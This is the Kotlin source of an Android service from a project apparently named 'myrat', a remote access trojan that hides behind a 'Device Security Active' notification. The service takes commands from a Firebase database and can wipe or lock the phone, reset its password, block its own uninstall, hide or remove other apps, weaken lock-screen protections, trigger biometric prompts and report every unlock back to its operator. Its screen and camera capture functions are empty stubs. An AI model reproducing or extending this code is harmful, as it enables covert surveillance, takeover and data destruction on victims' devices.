package com.myrat.app.service

import android.Manifest
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.biometrics.BiometricManager
import android.hardware.camera2.CameraManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import androidx.biometric.BiometricPrompt
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.BiometricAuthActivity
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.ConcurrentHashMap

class LockService : Service() {
    companion object {
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val NOTIFICATION_ID = 9
        private const val BIOMETRIC_REQUEST_CODE = 1001
    }

    private val db = Firebase.database.reference
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var windowManager: WindowManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var cameraManager: CameraManager

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private var overlayView: View? = null
    private val commandResults = ConcurrentHashMap<String, String>()
    private val biometricResultReceiver = BiometricResultReceiver()

    private var isServiceInitialized = false
    private var lastStatusUpdate = 0L
    private val STATUS_UPDATE_INTERVAL = 30000L // 30 seconds

    override fun onCreate() {
        super.onCreate()
        try {
            initializeService()
            startForegroundService()
            acquireWakeLock()
            registerReceivers()
            scheduleStatusUpdates()
            listenForCommands()
            updateServiceStatus(true)
            Logger.log("LockService created successfully")
        } catch (e: Exception) {
            Logger.error("Failed to create LockService", e)
            stopSelf()
        }
    }

    private fun initializeService() {
        deviceId = MainActivity.getDeviceId(this)
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        isServiceInitialized = true
    }

    private fun startForegroundService() {
        createNotificationChannel()
        val notification = buildForegroundNotification()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Device Lock Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Advanced device lock and security management"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Security Active")
            .setContentText("Advanced lock and security features enabled")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LockService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
            Logger.log("Wake lock acquired for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock", e)
        }
    }

    private fun registerReceivers() {
        try {
            val filter = IntentFilter().apply {
                addAction(BiometricAuthActivity.ACTION_BIOMETRIC_RESULT)
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(biometricResultReceiver, filter)
            Logger.log("Broadcast receivers registered")
        } catch (e: Exception) {
            Logger.error("Failed to register receivers", e)
        }
    }

    private fun scheduleStatusUpdates() {
        scope.launch {
            while (isActive) {
                try {
                    updateLockDetails()
                    delay(STATUS_UPDATE_INTERVAL)
                } catch (e: Exception) {
                    Logger.error("Error in status update", e)
                    delay(STATUS_UPDATE_INTERVAL)
                }
            }
        }
    }

    private fun listenForCommands() {
        try {
            val commandRef = db.child("Device").child(deviceId).child("deviceAdvice")
            commandRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (snapshot.exists()) {
                        val data = snapshot.value as? Map<String, Any> ?: return
                        val action = data["action"] as? String ?: return
                        val commandId = data["commandId"] as? String ?: return
                        val status = data["status"] as? String ?: return
                        val params = data["params"] as? Map<String, Any> ?: emptyMap()

                        if (status == "pending") {
                            Logger.log("Processing command: $action with ID: $commandId")
                            processCommand(action, commandId, params)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Command listener cancelled", error.toException())
                }
            })
        } catch (e: DatabaseException) {
            Logger.error("Failed to setup command listener", e)
        }
    }

    private fun processCommand(action: String, commandId: String, params: Map<String, Any>) {
        // Ensure scope is lifecycle-aware (e.g., lifecycleScope for Android components)
        scope.launch {
            try {
                updateCommandStatus(commandId, "processing", null)

                val result = when (action) {
                    "lock" -> lockDevice(commandId)
                    "unlock" -> unlockDevice(commandId)
                    "screenOn" -> turnScreenOn(commandId)
                    "screenOff" -> turnScreenOff(commandId)
                    "CaptureBiometricData" -> captureBiometricData(commandId)
                    "BiometricUnlock" -> performBiometricUnlock(commandId)
                    "wipeThePhone" -> wipeDevice(commandId)
                    "preventUninstall" -> preventUninstall(commandId)
                    "reboot" -> rebootDevice(commandId)
                    "resetPassword" -> {
                        val password = params["password"] as? String
                            ?: throw IllegalArgumentException("Password is required for resetPassword")
                        resetPassword(commandId, password)
                    }
                    "setPasswordQuality" -> {
                        val quality = params["quality"] as? String
                            ?: throw IllegalArgumentException("Quality is required for setPasswordQuality")
                        setPasswordQuality(commandId, quality)
                    }
                    "setLockTimeout" -> {
                        val timeout = params["timeout"] as? Long
                            ?: throw IllegalArgumentException("Timeout is required for setLockTimeout")
                        setLockTimeout(commandId, timeout)
                    }
                    "disableKeyguardFeatures" -> {
                        val features = params["features"] as? List<String>
                            ?: throw IllegalArgumentException("Features list is required for disableKeyguardFeatures")
                        disableKeyguardFeatures(commandId, features)
                    }
                    "captureScreen" -> captureScreen(commandId)
                    "capturePhoto" -> capturePhoto(commandId)
                    "captureFingerprint" -> captureFingerprint(commandId)
                    "disableApp" -> {
                        val packageName = params["packageName"] as? String
                            ?: throw IllegalArgumentException("Package name is required for disableApp")
                        disableApp(commandId, packageName)
                    }
                    "uninstallApp" -> {
                        val packageName = params["packageName"] as? String
                            ?: throw IllegalArgumentException("Package name is required for uninstallApp")
                        uninstallApp(commandId, packageName)
                    }
                    "monitorUnlock" -> monitorUnlockAttempts(commandId)
                    "getStatus" -> updateLockDetails()
                    else -> {
                        Logger.error("Unknown command: $action")
                        updateCommandStatus(commandId, "failed", "Unknown command: $action")
                        false
                    }
                }

                if (result) {
                    updateCommandStatus(commandId, "success", null)
                } else {
                    updateCommandStatus(commandId, "failed", "Command execution failed")
                }
            } catch (e: IllegalArgumentException) {
                Logger.error("Invalid parameters for command $action", e)
                updateCommandStatus(commandId, "failed", "Invalid parameters: ${e.message}")
            } catch (e: SecurityException) {
                Logger.error("Security error processing command $action", e)
                updateCommandStatus(commandId, "failed", "Security error: ${e.message}")
            } catch (e: Exception) {
                Logger.error("Unexpected error processing command $action", e)
                updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            }
        }
    }
    // Device Lock/Unlock Operations
    private suspend fun lockDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            devicePolicyManager.lockNow()
            Logger.log("Device locked successfully")
            true
        } catch (e: Exception) {
            Logger.error("Failed to lock device", e)
            false
        }
    }

    private suspend fun unlockDevice(commandId: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For newer Android versions, we can't directly unlock
                // Instead, we'll turn on the screen and show unlock prompt
                turnScreenOn(commandId)
                showUnlockPrompt()
                true
            } else {
                // For older versions, try to disable keyguard
                keyguardManager.newKeyguardLock("LockService").disableKeyguard()
                true
            }
        } catch (e: Exception) {
            Logger.error("Failed to unlock device", e)
            false
        }
    }

    private suspend fun turnScreenOn(commandId: String): Boolean {
        return try {
            val screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "LockService:ScreenOn"
            )
            screenWakeLock.acquire(10000) // 10 seconds
            screenWakeLock.release()
            Logger.log("Screen turned on")
            true
        } catch (e: Exception) {
            Logger.error("Failed to turn screen on", e)
            false
        }
    }

    private suspend fun turnScreenOff(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                devicePolicyManager.lockNow()
            } else {
                // For older versions, use reflection
                try {
                    val powerManagerClass = Class.forName("android.os.PowerManager")
                    val goToSleepMethod = powerManagerClass.getMethod("goToSleep", Long::class.javaPrimitiveType)
                    goToSleepMethod.invoke(powerManager, SystemClock.uptimeMillis())
                } catch (e: Exception) {
                    devicePolicyManager.lockNow()
                }
            }
            Logger.log("Screen turned off")
            true
        } catch (e: Exception) {
            Logger.error("Failed to turn screen off", e)
            false
        }
    }

    // Biometric Operations
    private suspend fun captureBiometricData(commandId: String): Boolean {
        return try {
            if (!isBiometricAvailable()) {
                throw SecurityException("Biometric authentication not available")
            }

            val intent = Intent(this, BiometricAuthActivity::class.java).apply {
                putExtra(BiometricAuthActivity.EXTRA_COMMAND_ID, commandId)
                putExtra(BiometricAuthActivity.EXTRA_ACTION, BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

            // Wait for result
            delay(30000) // 30 second timeout
            commandResults[commandId] != null
        } catch (e: Exception) {
            Logger.error("Failed to capture biometric data", e)
            false
        }
    }

    private suspend fun performBiometricUnlock(commandId: String): Boolean {
        return try {
            if (!isBiometricAvailable()) {
                throw SecurityException("Biometric authentication not available")
            }

            val intent = Intent(this, BiometricAuthActivity::class.java).apply {
                putExtra(BiometricAuthActivity.EXTRA_COMMAND_ID, commandId)
                putExtra(BiometricAuthActivity.EXTRA_ACTION, BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

            // Wait for result
            delay(30000) // 30 second timeout
            commandResults[commandId] == "success"
        } catch (e: Exception) {
            Logger.error("Failed to perform biometric unlock", e)
            false
        }
    }

    private suspend fun captureFingerprint(commandId: String): Boolean {
        return try {
            // Similar to biometric capture but specifically for fingerprint
            captureBiometricData(commandId)
        } catch (e: Exception) {
            Logger.error("Failed to capture fingerprint", e)
            false
        }
    }

    // Device Management Operations
    private suspend fun wipeDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            // Factory reset the device
            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
            Logger.log("Device wipe initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to wipe device", e)
            false
        }
    }

    private suspend fun preventUninstall(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            // Enable device admin lock to prevent uninstallation
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
            }
            Logger.log("Uninstall prevention enabled")
            true
        } catch (e: Exception) {
            Logger.error("Failed to prevent uninstall", e)
            false
        }
    }

    private suspend fun rebootDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                devicePolicyManager.reboot(adminComponent)
            } else {
                // For older versions, use shell command
                Runtime.getRuntime().exec("su -c reboot")
            }
            Logger.log("Device reboot initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to reboot device", e)
            false
        }
    }

    // Password and Security Operations
    private suspend fun resetPassword(commandId: String, newPassword: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (newPassword.isNullOrEmpty()) {
                throw IllegalArgumentException("Password cannot be empty")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For newer Android versions, we can't directly set password
                // Instead, we'll prompt user to change password
                val intent = Intent(DevicePolicyManager.ACTION_SET_NEW_PASSWORD)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                devicePolicyManager.resetPassword(newPassword, 0)
            }
            Logger.log("Password reset initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to reset password", e)
            false
        }
    }

    private suspend fun setPasswordQuality(commandId: String, quality: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            val qualityConstant = when (quality?.lowercase()) {
                "numeric" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
                "numeric_complex" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX
                "alphabetic" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC
                "alphanumeric" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC
                "complex" -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
                else -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
            }

            devicePolicyManager.setPasswordQuality(adminComponent, qualityConstant)
            Logger.log("Password quality set to: $quality")
            true
        } catch (e: Exception) {
            Logger.error("Failed to set password quality", e)
            false
        }
    }

    private suspend fun setLockTimeout(commandId: String, timeout: Long?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            val timeoutMs = timeout ?: 30000L
            devicePolicyManager.setMaximumTimeToLock(adminComponent, timeoutMs)
            Logger.log("Lock timeout set to: ${timeoutMs}ms")
            true
        } catch (e: Exception) {
            Logger.error("Failed to set lock timeout", e)
            false
        }
    }

    private suspend fun disableKeyguardFeatures(commandId: String, features: List<*>?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            var disableFlags = 0
            features?.forEach { feature ->
                when (feature.toString().lowercase()) {
                    "camera" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA
                    "notifications" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS
                    "fingerprint" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT
                    }
                    "face" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FACE
                    }
                }
            }

            devicePolicyManager.setKeyguardDisabledFeatures(adminComponent, disableFlags)
            Logger.log("Keyguard features disabled: $features")
            true
        } catch (e: Exception) {
            Logger.error("Failed to disable keyguard features", e)
            false
        }
    }

    // Surveillance Operations
    private suspend fun captureScreen(commandId: String): Boolean {
        return try {
            if (!hasOverlayPermission()) {
                throw SecurityException("Overlay permission not granted")
            }

            // Create a screenshot using MediaProjection or other methods
            val screenshot = captureScreenshot()
            if (screenshot != null) {
                saveScreenCapture(screenshot, commandId)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Failed to capture screen", e)
            false
        }
    }

    private suspend fun capturePhoto(commandId: String): Boolean {
        return try {
            if (!isCameraAvailable()) {
                throw SecurityException("Camera not available")
            }

            // Capture photo using camera
            val photo = capturePhotoFromCamera()
            if (photo != null) {
                savePhotoCapture(photo, commandId)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Failed to capture photo", e)
            false
        }
    }

    // App Management Operations
    private suspend fun disableApp(commandId: String, packageName: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (packageName.isNullOrEmpty()) {
                throw IllegalArgumentException("Package name cannot be empty")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                devicePolicyManager.setApplicationHidden(adminComponent, packageName, true)
            }
            Logger.log("App disabled: $packageName")
            true
        } catch (e: Exception) {
            Logger.error("Failed to disable app: $packageName", e)
            false
        }
    }

    private suspend fun uninstallApp(commandId: String, packageName: String?): Boolean {
        return try {
            if (packageName.isNullOrEmpty()) {
                throw IllegalArgumentException("Package name cannot be empty")
            }

            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            Logger.log("Uninstall initiated for: $packageName")
            true
        } catch (e: Exception) {
            Logger.error("Failed to uninstall app: $packageName", e)
            false
        }
    }

    // Monitoring Operations
    private suspend fun monitorUnlockAttempts(commandId: String): Boolean {
        return try {
            // Start monitoring unlock attempts
            val unlockData = mapOf(
                "isDeviceLocked" to keyguardManager.isKeyguardLocked,
                "isDeviceSecure" to keyguardManager.isKeyguardSecure,
                "timestamp" to System.currentTimeMillis()
            )

            db.child("Device").child(deviceId).child("unlock_attempts").push().setValue(unlockData)
            Logger.log("Unlock attempt monitored")
            true
        } catch (e: Exception) {
            Logger.error("Failed to monitor unlock attempts", e)
            false
        }
    }

    // Helper Methods
    private fun isDeviceAdminActive(): Boolean {
        return devicePolicyManager.isAdminActive(adminComponent)
    }

    private fun isBiometricAvailable(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val biometricManager = androidx.biometric.BiometricManager.from(this)
            biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS
        } else {
            false
        }
    }

    private fun hasOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun isCameraAvailable(): Boolean {
        return try {
            cameraManager.cameraIdList.isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            false
        }
    }

    private fun showUnlockPrompt() {
        try {
            if (hasOverlayPermission()) {
                // Create overlay to show unlock prompt
                // Implementation depends on specific requirements
            }
        } catch (e: Exception) {
            Logger.error("Failed to show unlock prompt", e)
        }
    }

    private fun captureScreenshot(): Bitmap? {
        return try {
            // Implementation for screen capture
            // This would require MediaProjection API for newer Android versions
            null
        } catch (e: Exception) {
            Logger.error("Failed to capture screenshot", e)
            null
        }
    }

    private fun capturePhotoFromCamera(): Bitmap? {
        return try {
            // Implementation for camera capture
            // This would require Camera2 API
            null
        } catch (e: Exception) {
            Logger.error("Failed to capture photo", e)
            null
        }
    }

    private fun saveScreenCapture(bitmap: Bitmap, commandId: String) {
        try {
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
            val imageData = outputStream.toByteArray()
            val base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.DEFAULT)

            val captureData = mapOf(
                "image" to base64Image,
                "timestamp" to System.currentTimeMillis(),
                "commandId" to commandId
            )

            db.child("Device").child(deviceId).child("screen_captures").push().setValue(captureData)
            Logger.log("Screen capture saved")
        } catch (e: Exception) {
            Logger.error("Failed to save screen capture", e)
        }
    }

    private fun savePhotoCapture(bitmap: Bitmap, commandId: String) {
        try {
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
            val imageData = outputStream.toByteArray()
            val base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.DEFAULT)

            val captureData = mapOf(
                "image" to base64Image,
                "timestamp" to System.currentTimeMillis(),
                "commandId" to commandId
            )

            db.child("Device").child(deviceId).child("photo_captures").push().setValue(captureData)
            Logger.log("Photo capture saved")
        } catch (e: Exception) {
            Logger.error("Failed to save photo capture", e)
        }
    }

    private fun updateLockDetails(): Boolean {
        return try {
            val biometricManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                androidx.biometric.BiometricManager.from(this)
            } else null

            val biometricStatus = when (biometricManager?.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Available"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware Unavailable"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                else -> "Unknown"
            }

            val lockDetails = mapOf(
                "connected" to true,
                "isDeviceSecure" to keyguardManager.isKeyguardSecure,
                "biometricStatus" to biometricStatus,
                "biometricType" to getBiometricType(),
                "isDeviceAdminActive" to isDeviceAdminActive(),
                "passwordQuality" to getPasswordQuality(),
                "lockScreenTimeout" to getLockScreenTimeout(),
                "keyguardFeatures" to getKeyguardFeatures(),
                "androidVersion" to Build.VERSION.SDK_INT,
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "serviceInitialized" to isServiceInitialized,
                "networkAvailable" to isNetworkAvailable(),
                "cameraAvailable" to isCameraAvailable(),
                "fingerprintAvailable" to isBiometricAvailable(),
                "overlayPermission" to hasOverlayPermission(),
                "lastUpdate" to System.currentTimeMillis()
            )

            db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
            lastStatusUpdate = System.currentTimeMillis()
            Logger.log("Lock details updated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to update lock details", e)
            false
        }
    }

    private fun getBiometricType(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val packageManager = packageManager
                when {
                    packageManager.hasSystemFeature(PackageManager.FEATURE_FINGERPRINT) -> "Fingerprint"
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && packageManager.hasSystemFeature(PackageManager.FEATURE_FACE) -> "Face"
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && packageManager.hasSystemFeature(PackageManager.FEATURE_IRIS) -> "Iris"
                    else -> "None"
                }
            } else {
                "None"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getPasswordQuality(): String {
        return try {
            if (isDeviceAdminActive()) {
                when (devicePolicyManager.getPasswordQuality(adminComponent)) {
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC -> "Numeric"
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX -> "Numeric Complex"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC -> "Alphabetic"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC -> "Alphanumeric"
                    DevicePolicyManager.PASSWORD_QUALITY_COMPLEX -> "Complex"
                    else -> "Unknown"
                }
            } else {
                "Not Available"
            }
        } catch (e: Exception) {
            "Error"
        }
    }

    private fun getLockScreenTimeout(): Long {
        return try {
            if (isDeviceAdminActive()) {
                devicePolicyManager.getMaximumTimeToLock(adminComponent)
            } else {
                -1L
            }
        } catch (e: Exception) {
            -1L
        }
    }

    private fun getKeyguardFeatures(): List<String> {
        return try {
            if (isDeviceAdminActive()) {
                val features = mutableListOf<String>()
                val disabledFeatures = devicePolicyManager.getKeyguardDisabledFeatures(adminComponent)

                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA != 0) {
                    features.add("Camera Disabled")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS != 0) {
                    features.add("Notifications Disabled")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                    disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT != 0) {
                    features.add("Fingerprint Disabled")
                }

                features
            } else {
                emptyList()
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    private fun updateServiceStatus(connected: Boolean) {
        try {
            db.child("Device").child(deviceId).child("lock_service").setValue(
                mapOf(
                    "connected" to connected,
                    "lastSeen" to System.currentTimeMillis(),
                    "version" to "1.0.0"
                )
            )
        } catch (e: Exception) {
            Logger.error("Failed to update service status", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }

            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
        } catch (e: Exception) {
            Logger.error("Failed to update command status", e)
        }
    }

    // Updated BiometricResultReceiver class
    private inner class BiometricResultReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                BiometricAuthActivity.ACTION_BIOMETRIC_RESULT -> {
                    val commandId = intent.getStringExtra(BiometricAuthActivity.EXTRA_COMMAND_ID)
                    val result = intent.getStringExtra(BiometricAuthActivity.EXTRA_RESULT)
                    val error = intent.getStringExtra(BiometricAuthActivity.EXTRA_ERROR)
                    val action = intent.getStringExtra(BiometricAuthActivity.EXTRA_ACTION)

                    if (commandId != null && result != null) {
                        commandResults[commandId] = result

                        if (result == BiometricAuthActivity.RESULT_SUCCESS && action != null) {
                            // Save biometric data
                            val biometricData = mapOf(
                                "action" to action,
                                "result" to result,
                                "timestamp" to System.currentTimeMillis(),
                                "commandId" to commandId
                            )
                            db.child("Device").child(deviceId).child("biometric_data").setValue(biometricData)
                        }

                        Logger.log("Biometric result received: $result for command: $commandId")
                    }
                }
                Intent.ACTION_SCREEN_ON -> {
                    Logger.log("Screen turned on")
                    // Launch coroutine to call suspend function
                    scope.launch {
                        monitorUnlockAttempts("screen_on_${System.currentTimeMillis()}")
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    Logger.log("Screen turned off")
                }
                Intent.ACTION_USER_PRESENT -> {
                    Logger.log("User present (device unlocked)")
                    // Launch coroutine to call suspend function
                    scope.launch {
                        monitorUnlockAttempts("user_present_${System.currentTimeMillis()}")
                    }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            overlayView?.let {
                windowManager.removeView(it)
            }

            try {
                unregisterReceiver(biometricResultReceiver)
            } catch (e: IllegalArgumentException) {
                // Receiver not registered
            }

            scope.cancel()
            updateServiceStatus(false)
            Logger.log("LockService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying LockService", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}